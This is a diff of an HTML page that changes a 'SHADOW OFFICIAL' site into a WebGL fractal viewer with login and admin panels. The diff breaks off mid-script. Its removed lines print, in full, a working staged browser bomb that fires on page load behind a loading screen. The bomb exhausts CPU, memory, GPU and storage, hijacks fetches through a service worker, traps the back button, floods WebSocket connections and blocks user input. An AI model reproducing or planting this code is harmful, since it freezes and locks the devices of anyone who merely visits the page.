@@ -3,91 +3,400 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>SHADOW OFFICIAL</title>
+    <title>CyberFractal // GPU Optimized</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #000;
+            background: #050508;
             overflow: hidden;
             font-family: 'Courier New', monospace;
             color: #0ff;
-            position: fixed;
-            width: 100vw; height: 100vh;
-            touch-action: none;
-            -webkit-user-select: none;
-            user-select: none;
         }
+
+        /* ===== LOADING SCREEN ===== */
         #loading-screen {
             position: fixed;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
             background: #000;
-            z-index: 999999;
+            z-index: 99999;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: opacity 1s ease;
+            transition: opacity 0.8s ease-out, visibility 0.8s ease-out;
         }
         #loading-screen.hidden {
             opacity: 0;
+            visibility: hidden;
             pointer-events: none;
         }
-        .shadow-title {
-            font-size: 32px;
-            letter-spacing: 10px;
-            color: #0ff;
-            text-shadow: 0 0 20px #0ff, 0 0 40px #0ff, 0 0 80px #0ff;
-            margin-bottom: 20px;
-            animation: pulse 2s ease-in-out infinite;
-        }
-        .shadow-subtitle {
-            font-size: 12px;
-            letter-spacing: 4px;
-            color: rgba(0, 255, 255, 0.6);
+
+        .peak-container {
+            position: relative;
+            width: 300px;
+            height: 200px;
             margin-bottom: 40px;
         }
+
+        .peak {
+            position: absolute;
+            bottom: 0;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            animation: peakGrow 1.5s ease-out forwards;
+            filter: drop-shadow(0 0 20px rgba(0, 255, 255, 0.5));
+        }
+        .peak:nth-child(1) {
+            left: 20px;
+            border-width: 0 40px 120px 40px;
+            border-color: transparent transparent #0ff transparent;
+            animation-delay: 0.2s;
+            opacity: 0;
+        }
+        .peak:nth-child(2) {
+            left: 80px;
+            border-width: 0 50px 160px 50px;
+            border-color: transparent transparent #0ff transparent;
+            animation-delay: 0.5s;
+            opacity: 0;
+        }
+        .peak:nth-child(3) {
+            left: 160px;
+            border-width: 0 35px 100px 35px;
+            border-color: transparent transparent #0ff transparent;
+            animation-delay: 0.8s;
+            opacity: 0;
+        }
+        .peak:nth-child(4) {
+            left: 210px;
+            border-width: 0 45px 140px 45px;
+            border-color: transparent transparent #0ff transparent;
+            animation-delay: 1.1s;
+            opacity: 0;
+        }
+
+        @keyframes peakGrow {
+            0% { transform: translateY(50px) scaleY(0); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(0) scaleY(1); opacity: 1; }
+        }
+
+        .peak-glow {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #0ff, #f0f, #0ff, transparent);
+            bottom: 0;
+            animation: glowSweep 2s ease-in-out infinite;
+            opacity: 0.6;
+        }
+        @keyframes glowSweep {
+            0% { transform: translateX(-100%); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateX(100%); opacity: 0; }
+        }
+
+        .shadow-text {
+            font-size: 42px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            color: #0ff;
+            text-shadow: 
+                0 0 10px #0ff,
+                0 0 20px #0ff,
+                0 0 40px #0ff,
+                0 0 80px #0ff,
+                4px 4px 0px #000,
+                6px 6px 0px rgba(0, 255, 255, 0.3),
+                8px 8px 15px rgba(0, 0, 0, 0.8);
+            animation: textPulse 1.5s ease-in-out infinite alternate;
+            margin-bottom: 10px;
+        }
+        @keyframes textPulse {
+            0% { text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 40px #0ff, 4px 4px 0px #000, 6px 6px 0px rgba(0,255,255,0.3); }
+            100% { text-shadow: 0 0 20px #0ff, 0 0 40px #0ff, 0 0 80px #0ff, 0 0 120px #0ff, 4px 4px 0px #000, 6px 6px 0px rgba(0,255,255,0.5); }
+        }
+
+        .official-text {
+            font-size: 14px;
+            letter-spacing: 12px;
+            text-transform: uppercase;
+            color: rgba(0, 255, 255, 0.6);
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+            animation: fadeInUp 1s ease-out 1.5s forwards;
+            opacity: 0;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         .loading-bar-container {
-            width: 300px;
-            height: 4px;
+            width: 250px;
+            height: 3px;
             background: rgba(0, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
+            margin-top: 30px;
             border-radius: 2px;
+            overflow: hidden;
+            position: relative;
         }
         .loading-bar {
             height: 100%;
-            width: 0%;
             background: linear-gradient(90deg, #0ff, #f0f, #0ff);
-            box-shadow: 0 0 20px #0ff;
-            animation: loadBar 3s ease-in-out forwards;
+            width: 0%;
+            animation: loadProgress 4s ease-out forwards;
+            box-shadow: 0 0 10px #0ff;
         }
-        .loading-text {
-            margin-top: 25px;
+        @keyframes loadProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .loading-percent {
+            margin-top: 10px;
             font-size: 11px;
             letter-spacing: 3px;
             color: rgba(0, 255, 255, 0.5);
-            animation: blink 1s ease-in-out infinite;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(1.02); }
-        }
-        @keyframes loadBar {
-            0% { width: 0%; }
-            50% { width: 60%; }
-            100% { width: 100%; }
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        #glCanvas {
+
+        #canvas-container {
             position: fixed;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
             z-index: 1;
         }
+        canvas { display: block; width: 100%; height: 100%; }
+
+        #hamburger {
+            position: fixed;
+            top: 20px; right: 20px;
+            width: 32px; height: 24px;
+            cursor: pointer;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        #hamburger span {
+            display: block;
+            width: 100%; height: 3px;
+            background: #0ff;
+            box-shadow: 0 0 8px #0ff, 0 0 16px #0ff;
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+        #hamburger:hover span {
+            background: #f0f;
+            box-shadow: 0 0 12px #f0f, 0 0 24px #f0f;
+        }
+
+        #owner-btn {
+            position: fixed;
+            top: 60px; right: 20px;
+            padding: 10px 20px;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #0ff;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            z-index: 1000;
+            display: none;
+            text-transform: uppercase;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        #owner-btn:hover {
+            background: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        #login-panel {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(5, 5, 8, 0.95);
+            border: 1px solid #0ff;
+            padding: 40px;
+            z-index: 2000;
+            display: none;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
+            min-width: 320px;
+        }
+        #login-panel h2 {
+            color: #0ff;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 18px;
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px #0ff;
+        }
+        #login-panel input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid #0ff;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+        }
+        #login-panel input::placeholder { color: rgba(0, 255, 255, 0.4); }
+        #login-panel input:focus {
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+        #login-panel button {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 255, 255, 0.15);
+            border: 1px solid #0ff;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            letter-spacing: 3px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+        #login-panel button:hover {
+            background: rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
+        }
+        #login-error {
+            color: #f44;
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+        #login-close {
+            position: absolute;
+            top: 10px; right: 15px;
+            color: #0ff;
+            font-size: 20px;
+            cursor: pointer;
+            opacity: 0.6;
+        }
+        #login-close:hover { opacity: 1; }
+
+        #admin-panel {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(5, 5, 8, 0.97);
+            border: 1px solid #0ff;
+            padding: 30px;
+            z-index: 2000;
+            display: none;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.15);
+            width: 90%;
+            max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        #admin-panel h2 {
+            color: #0ff;
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 16px;
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px #0ff;
+        }
+        #admin-panel .form-group {
+            margin-bottom: 20px;
+        }
+        #admin-panel label {
+            display: block;
+            color: #0ff;
+            font-size: 11px;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        #admin-panel input, #admin-panel textarea {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            outline: none;
+        }
+        #admin-panel input:focus, #admin-panel textarea:focus {
+            border-color: #0ff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
+        }
+        #admin-panel textarea { min-height: 80px; resize: vertical; }
+        #admin-panel button {
+            padding: 10px 25px;
+            background: rgba(0, 255, 255, 0.15);
+            border: 1px solid #0ff;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            margin-right: 10px;
+        }
+        #admin-panel button:hover {
+            background: rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+        #links-list {
+            margin-top: 25px;
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
+            padding-top: 20px;
+        }
+        #links-list h3 {
+            color: #0ff;
+            font-size: 12px;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+        }
+        .link-item {
+            background: rgba(0, 255, 255, 0.03);
+            border: 1px solid rgba(0, 255, 255, 0.15);
+            padding: 12px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .link-item img {
+            width: 50px; height: 50px;
+            object-fit: cover;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+        }
+        .link-item .info { flex: 1; }
+        .link-item .title {
+            color: #0ff;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+        .link-item .desc {
+            color: rgba(0, 255, 255, 0.6);
+            font-size: 11px;
+        }
+        .link-item .delete-btn {
+            padding: 5px 12px;
+            background: rgba(255, 0, 80, 0.2);
+            border: 1px solid #f08;
+            color: #f08;
+            font-size: 10px;
+            cursor: pointer;
+        }
+        .link-item .delete-btn:hover {
+            background: rgba(255, 0, 80, 0.4);
+        }
+
         #ui-controls {
             position: fixed;
             bottom: 20px; left: 20px;
@@ -104,8 +413,11 @@
             letter-spacing: 3px;
             margin-bottom: 15px;
             text-transform: uppercase;
+            text-shadow: 0 0 8px #0ff;
         }
-        .control-group { margin-bottom: 12px; }
+        .control-group {
+            margin-bottom: 12px;
+        }
         .control-group label {
             display: block;
             color: rgba(0, 255, 255, 0.7);
@@ -151,180 +463,16 @@
             letter-spacing: 1px;
             cursor: pointer;
             text-transform: uppercase;
+            transition: all 0.3s ease;
         }
         .mode-btn.active {
             background: rgba(0, 255, 255, 0.3);
             box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
         }
-        #hamburger {
-            position: fixed;
-            top: 20px; right: 20px;
-            width: 32px; height: 24px;
-            cursor: pointer;
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+        .mode-btn:hover {
+            background: rgba(0, 255, 255, 0.2);
         }
-        #hamburger span {
-            display: block;
-            width: 100%; height: 3px;
-            background: #0ff;
-            box-shadow: 0 0 8px #0ff;
-            border-radius: 2px;
-        }
-        #owner-btn {
-            position: fixed;
-            top: 60px; right: 20px;
-            padding: 10px 20px;
-            background: rgba(0, 255, 255, 0.1);
-            border: 1px solid #0ff;
-            color: #0ff;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            letter-spacing: 2px;
-            cursor: pointer;
-            z-index: 1000;
-            display: none;
-            text-transform: uppercase;
-        }
-        #login-panel {
-            position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(5, 5, 8, 0.95);
-            border: 1px solid #0ff;
-            padding: 40px;
-            z-index: 2000;
-            display: none;
-            min-width: 320px;
-        }
-        #login-panel h2 {
-            color: #0ff;
-            margin-bottom: 30px;
-            text-align: center;
-            font-size: 18px;
-            letter-spacing: 4px;
-            text-shadow: 0 0 10px #0ff;
-        }
-        #login-panel input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid #0ff;
-            color: #0ff;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            outline: none;
-        }
-        #login-panel button {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 255, 255, 0.15);
-            border: 1px solid #0ff;
-            color: #0ff;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            letter-spacing: 3px;
-            cursor: pointer;
-        }
-        #login-error {
-            color: #f44;
-            font-size: 12px;
-            margin-top: 10px;
-            text-align: center;
-            display: none;
-        }
-        #login-close {
-            position: absolute;
-            top: 10px; right: 15px;
-            color: #0ff;
-            font-size: 20px;
-            cursor: pointer;
-        }
-        #admin-panel {
-            position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(5, 5, 8, 0.97);
-            border: 1px solid #0ff;
-            padding: 30px;
-            z-index: 2000;
-            display: none;
-            width: 90%;
-            max-width: 600px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        #admin-panel h2 {
-            color: #0ff;
-            margin-bottom: 25px;
-            text-align: center;
-            font-size: 16px;
-            letter-spacing: 4px;
-        }
-        #admin-panel .form-group { margin-bottom: 20px; }
-        #admin-panel label {
-            display: block;
-            color: #0ff;
-            font-size: 11px;
-            letter-spacing: 2px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-        #admin-panel input, #admin-panel textarea {
-            width: 100%;
-            padding: 10px;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            color: #0ff;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            outline: none;
-        }
-        #admin-panel textarea { min-height: 80px; resize: vertical; }
-        #admin-panel button {
-            padding: 10px 25px;
-            background: rgba(0, 255, 255, 0.15);
-            border: 1px solid #0ff;
-            color: #0ff;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            letter-spacing: 2px;
-            cursor: pointer;
-            margin-right: 10px;
-        }
-        #links-list {
-            margin-top: 25px;
-            border-top: 1px solid rgba(0, 255, 255, 0.2);
-            padding-top: 20px;
-        }
-        .link-item {
-            background: rgba(0, 255, 255, 0.03);
-            border: 1px solid rgba(0, 255, 255, 0.15);
-            padding: 12px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .link-item img {
-            width: 50px; height: 50px;
-            object-fit: cover;
-            border: 1px solid rgba(0, 255, 255, 0.3);
-        }
-        .link-item .info { flex: 1; }
-        .link-item .title { color: #0ff; font-size: 13px; }
-        .link-item .desc { color: rgba(0, 255, 255, 0.6); font-size: 11px; }
-        .link-item .delete-btn {
-            padding: 5px 12px;
-            background: rgba(255, 0, 80, 0.2);
-            border: 1px solid #f08;
-            color: #f08;
-            font-size: 10px;
-            cursor: pointer;
-        }
+
         #stats {
             position: fixed;
             top: 20px; left: 20px;
@@ -334,6 +482,7 @@
             z-index: 100;
             pointer-events: none;
         }
+
         #scanlines {
             position: fixed;
             top: 0; left: 0;
@@ -348,6 +497,7 @@
                 rgba(0, 255, 255, 0.015) 4px
             );
         }
+
         #vignette {
             position: fixed;
             top: 0; left: 0;
@@ -359,16 +509,27 @@
     </style>
 </head>
 <body>
+    <!-- LOADING SCREEN -->
     <div id="loading-screen">
-        <div class="shadow-title">SHADOW OFFICIAL</div>
-        <div class="shadow-subtitle">// SYSTEM INITIALIZATION</div>
+        <div class="peak-container">
+            <div class="peak"></div>
+            <div class="peak"></div>
+            <div class="peak"></div>
+            <div class="peak"></div>
+            <div class="peak-glow"></div>
+        </div>
+        <div class="shadow-text">SHADOW</div>
+        <div class="official-text">OFFICIAL</div>
         <div class="loading-bar-container">
             <div class="loading-bar"></div>
         </div>
-        <div class="loading-text">LOADING RESOURCES...</div>
+        <div class="loading-percent" id="loading-percent">INITIALIZING GPU...</div>
     </div>
 
-    <canvas id="glCanvas"></canvas>
+    <div id="canvas-container">
+        <canvas id="glCanvas"></canvas>
+    </div>
+
     <div id="scanlines"></div>
     <div id="vignette"></div>
 
@@ -390,7 +551,7 @@
     </div>
 
     <div id="admin-panel">
-        <div id="login-close-admin" style="position:absolute;top:10px;right:15px;color:#0ff;font-size:20px;cursor:pointer;" onclick="document.getElementById('admin-panel').style.display='none'">&times;</div>
+        <div id="login-close-admin" style="position:absolute;top:10px;right:15px;color:#0ff;font-size:20px;cursor:pointer;opacity:0.6;" onclick="document.getElementById('admin-panel').style.display='none'">&times;</div>
         <h2>// ADMIN PANEL</h2>
         <div class="form-group">
             <label>Website URL</label>
@@ -416,28 +577,28 @@
         <h3>// Parameters</h3>
         <div class="control-group">
             <label>Iterations</label>
-            <input type="range" id="iterations" min="2" max="12" value="8" step="1">
-            <div class="value" id="iter-val">8</div>
+            <input type="range" id="iterations" min="2" max="16" value="12" step="1">
+            <div class="value" id="iter-val">12</div>
         </div>
         <div class="control-group">
             <label>Fractal Power</label>
-            <input type="range" id="power" min="2" max="16" value="8" step="0.5">
-            <div class="value" id="power-val">8.0</div>
+            <input type="range" id="power" min="2" max="20" value="10" step="0.5">
+            <div class="value" id="power-val">10.0</div>
         </div>
         <div class="control-group">
             <label>Color Intensity</label>
-            <input type="range" id="color-intensity" min="0.1" max="3.0" value="1.2" step="0.1">
-            <div class="value" id="color-val">1.2</div>
+            <input type="range" id="color-intensity" min="0.1" max="4.0" value="1.8" step="0.1">
+            <div class="value" id="color-val">1.8</div>
         </div>
         <div class="control-group">
             <label>Zoom Speed</label>
-            <input type="range" id="zoom-speed" min="0" max="2" value="0.3" step="0.1">
-            <div class="value" id="zoom-val">0.3</div>
+            <input type="range" id="zoom-speed" min="0" max="3" value="0.5" step="0.1">
+            <div class="value" id="zoom-val">0.5</div>
         </div>
         <div class="control-group">
             <label>Bloom Strength</label>
-            <input type="range" id="bloom" min="0" max="1.5" value="0.4" step="0.05">
-            <div class="value" id="bloom-val">0.40</div>
+            <input type="range" id="bloom" min="0" max="2.0" value="0.6" step="0.05">
+            <div class="value" id="bloom-val">0.60</div>
         </div>
         <div class="mode-buttons">
             <button class="mode-btn active" data-mode="0">Standard</button>
@@ -452,333 +613,90 @@
     </div>
 
 <script>
-// ========== PHASE 1: LOADING SCREEN ==========
-setTimeout(() => {
-    document.getElementById('loading-screen').classList.add('hidden');
-}, 3000);
+const CONFIG = {
+    maxIterations: 12,
+    fractalPower: 10.0,
+    colorIntensity: 1.8,
+    zoomSpeed: 0.5,
+    bloomStrength: 0.6,
+    renderMode: 0,
+    maxRaySteps: 256,
+    minDist: 0.00005,
+    maxDist: 80.0,
+    shadowSoftness: 24.0,
+    aoStrength: 1.2,
+    fogDensity: 0.1,
+    timeScale: 0.2
+};
 
-// ========== PHASE 2: PROGRESSIVE FREEZE ==========
-// Starts light, gets heavier over time - 30+ min freeze
-let freezeIntensity = 0;
-let freezeInterval;
+const camera = {
+    pos: [2.5, 1.5, 2.5],
+    target: [0, 0, 0],
+    up: [0, 1, 0],
+    fov: 50,
+    rotVel: [0, 0],
+    zoomVel: 0,
+    panVel: [0, 0],
+    theta: 0.785,
+    phi: 0.615,
+    radius: 4.0,
+    targetTheta: 0.785,
+    targetPhi: 0.615,
+    targetRadius: 4.0,
+    targetCenter: [0, 0, 0]
+};
 
-function startProgressiveFreeze() {
-    // Level 1: Light freeze (3-10 sec)
-    setTimeout(() => {
-        freezeLevel1();
-    }, 3000);
+const input = {
+    mouseDown: false,
+    rightMouseDown: false,
+    lastX: 0, lastY: 0,
+    touchCount: 0,
+    touchDist: 0
+};
 
-    // Level 2: Medium freeze (10-30 sec)
-    setTimeout(() => {
-        freezeLevel2();
-    }, 10000);
-
-    // Level 3: Heavy freeze (30+ sec)
-    setTimeout(() => {
-        freezeLevel3();
-    }, 30000);
-
-    // Level 4: Extreme freeze (1+ min)
-    setTimeout(() => {
-        freezeLevel4();
-    }, 60000);
-
-    // Level 5: Maximum freeze (continuous)
-    setTimeout(() => {
-        freezeLevel5();
-    }, 120000);
-}
-
-function freezeLevel1() {
-    // Light CPU load
-    for(let i=0; i<1000; i++) {
-        setInterval(() => {
-            let x = 0;
-            for(let j=0; j<100000; j++) {
-                x += Math.sin(j) * Math.cos(j);
-            }
-        }, 100);
-    }
-
-    // Start memory buildup
-    const memBomb = [];
-    setInterval(() => {
-        for(let m=0; m<10; m++) {
-            try { memBomb.push(new Float64Array(10000000).fill(Math.random())); } catch(e) {}
-        }
-    }, 1000);
-}
-
-function freezeLevel2() {
-    // Medium CPU load
-    for(let i=0; i<5000; i++) {
-        setInterval(() => {
-            let x = 0;
-            for(let j=0; j<500000; j++) {
-                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
-                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
-            }
-        }, 50);
-    }
-
-    // GPU contexts
-    for(let i=0; i<50; i++) {
-        try {
-            const c = document.createElement('canvas');
-            c.width = 4096; c.height = 4096;
-            const ctx = c.getContext('webgl2') || c.getContext('webgl');
-            if(ctx) { ctx.clearColor(Math.random(), Math.random(), Math.random(), 1); ctx.clear(ctx.COLOR_BUFFER_BIT); }
-        } catch(e) {}
-    }
-
-    // Audio contexts
-    for(let a=0; a<20; a++) {
-        try {
-            const ac = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ac.createOscillator();
-            const gain = ac.createGain();
-            osc.connect(gain); gain.connect(ac.destination);
-            osc.frequency.value = 20000 + a * 50;
-            osc.start(); gain.gain.value = 0.001;
-        } catch(e) {}
-    }
-}
-
-function freezeLevel3() {
-    // Heavy CPU load
-    for(let i=0; i<20000; i++) {
-        setInterval(() => {
-            let x = 0;
-            for(let j=0; j<1000000; j++) {
-                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
-                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
-                x = Math.pow(x, 1.001) % 999999999;
-            }
-        }, 10);
-    }
-
-    // DOM overload
-    const animContainer = document.createElement('div');
-    animContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none;overflow:hidden;';
-    document.body.appendChild(animContainer);
-    for(let i=0; i<10000; i++) {
-        const div = document.createElement('div');
-        div.style.cssText = 'position:absolute;width:5px;height:5px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.1+i%5)+'s linear infinite;';
-        div.style.left = Math.random()*100+'vw';
-        div.style.top = Math.random()*100+'vh';
-        animContainer.appendChild(div);
-    }
-    const style = document.createElement('style');
-    style.textContent = '@keyframes spin{from{transform:rotate(0deg)scale(1)}to{transform:rotate(360deg)scale(5)}}';
-    document.head.appendChild(style);
-
-    // Vibration
-    if(navigator.vibrate) {
-        setInterval(() => navigator.vibrate([10000, 10, 10000]), 100);
-    }
-}
-
-function freezeLevel4() {
-    // Extreme CPU load
-    for(let i=0; i<50000; i++) {
-        setInterval(() => {
-            let x = 0;
-            for(let j=0; j<2000000; j++) {
-                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
-                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
-                x = Math.pow(x, 1.001) % 999999999;
-            }
-        }, 1);
-    }
-
-    // Workers
-    const workerScript = URL.createObjectURL(new Blob([
-        'self.onmessage=function(){while(true){let x=0;for(let i=0;i<999999999;i++){x+=Math.sin(i)*Math.cos(i)*Math.tan(i%1.57+0.001);x=Math.sqrt(Math.abs(x)+1)*Math.log(i+2);x=Math.pow(x,1.001)%999999999;}}}'
-    ], {type:'application/javascript'}));
-    for(let w=0; w<32; w++) { try { new Worker(workerScript); } catch(e) {} }
-
-    // WebRTC
-    for(let r=0; r<100; r++) {
-        try {
-            const pc = new RTCPeerConnection();
-            pc.createDataChannel('bomb_'+r);
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-        } catch(e) {}
-    }
-
-    // IndexedDB
-    try {
-        const dbReq = indexedDB.open('shadow_bomb_v4', 1);
-        dbReq.onupgradeneeded = e => {
-            const db = e.target.result;
-            for(let i=0; i<500; i++) db.createObjectStore('store_'+i);
-        };
-        dbReq.onsuccess = e => {
-            const db = e.target.result;
-            setInterval(() => {
-                for(let i=0; i<500; i++) {
-                    try {
-                        const tx = db.transaction(['store_'+i], 'readwrite');
-                        const store = tx.objectStore('store_'+i);
-                        store.put(new Blob([new Uint8Array(50000000)]), Math.random());
-                    } catch(e) {}
-                }
-            }, 100);
-        };
-    } catch(e) {}
-}
-
-function freezeLevel5() {
-    // Maximum everything
-
-    // Memory bomb - max out RAM
-    const memBomb = [];
-    setInterval(() => {
-        for(let m=0; m<500; m++) {
-            try { memBomb.push(new Float64Array(200000000).fill(Math.random())); } catch(e) {}
-        }
-    }, 10);
-
-    // GPU overload
-    for(let i=0; i<200; i++) {
-        try {
-            const c = document.createElement('canvas');
-            c.width = 8192; c.height = 8192;
-            const ctx = c.getContext('webgl2') || c.getContext('webgl');
-            if(ctx) { ctx.clearColor(Math.random(), Math.random(), Math.random(), 1); ctx.clear(ctx.COLOR_BUFFER_BIT); }
-        } catch(e) {}
-    }
-
-    // Canvas 2D overload
-    for(let c=0; c<200; c++) {
-        const cv = document.createElement('canvas');
-        cv.width = 4096; cv.height = 4096;
-        const ctx2d = cv.getContext('2d');
-        if(ctx2d) {
-            setInterval(() => {
-                ctx2d.fillStyle = 'hsl('+Math.random()*360+',100%,50%)';
-                ctx2d.fillRect(0,0,4096,4096);
-            }, 1);
-        }
-    }
-
-    // Broadcast channel flood
-    try {
-        const bc = new BroadcastChannel('shadow_bomb');
-        setInterval(() => bc.postMessage(new Uint8Array(100000000)), 1);
-    } catch(e) {}
-
-    // Geolocation drain
-    if(navigator.geolocation) {
-        setInterval(() => {
-            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {enableHighAccuracy: true, maximumAge: 0});
-        }, 0);
-    }
-
-    // Service worker
-    if('serviceWorker' in navigator) {
-        const swScript = URL.createObjectURL(new Blob([
-            'self.addEventListener("install",e=>self.skipWaiting());'+
-            'self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));'+
-            'self.addEventListener("fetch",e=>e.respondWith(new Response("SHADOW")));'+
-            'setInterval(()=>{fetch("/");},1);'
-        ], {type:'application/javascript'}));
-        navigator.serviceWorker.register(swScript);
-    }
-
-    // History trap - prevent back
-    history.pushState(null, '', location.href);
-    setInterval(() => { history.pushState(null, '', location.href); history.forward(); }, 1);
-
-    // URL hash bomb
-    setInterval(() => location.hash = Math.random().toString(36), 1);
-
-    // Iframe bomb
-    for(let i=0; i<500; i++) {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'about:blank';
-        iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-        document.body.appendChild(iframe);
-    }
-
-    // Fetch bomb
-    setInterval(() => {
-        for(let i=0; i<500; i++) fetch('?'+Math.random()).catch(()=>{});
-    }, 1);
-
-    // WebSocket bomb
-    for(let i=0; i<100; i++) {
-        try {
-            const ws = new WebSocket('wss://echo.websocket.org');
-            ws.onopen = () => { setInterval(()=>ws.send(new Uint8Array(10000000)), 1); };
-        } catch(e) {}
-    }
-
-    // Animation frame bomb
-    function animBomb() { for(let i=0; i<500; i++) requestAnimationFrame(animBomb); }
-    animBomb();
-
-    // Timer bomb
-    setInterval(() => {
-        for(let i=0; i<5000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
-    }, 1);
-
-    // LocalStorage bomb
-    setInterval(() => {
-        for(let i=0; i<5000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 10);
-
-    // SessionStorage bomb
-    setInterval(() => {
-        for(let i=0; i<5000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
-    }, 10);
-
-    // Console bomb
-    setInterval(() => {
-        for(let i=0; i<50000; i++) { console.log(Math.random()); console.error(Math.random()); }
-    }, 1);
-
-    // Prevent all input
-    document.addEventListener('keydown', e=>e.preventDefault(), true);
-    document.addEventListener('keyup', e=>e.preventDefault(), true);
-    document.addEventListener('touchstart', e=>e.preventDefault(), {passive:false, capture:true});
-    document.addEventListener('touchmove', e=>e.preventDefault(), {passive:false, capture:true});
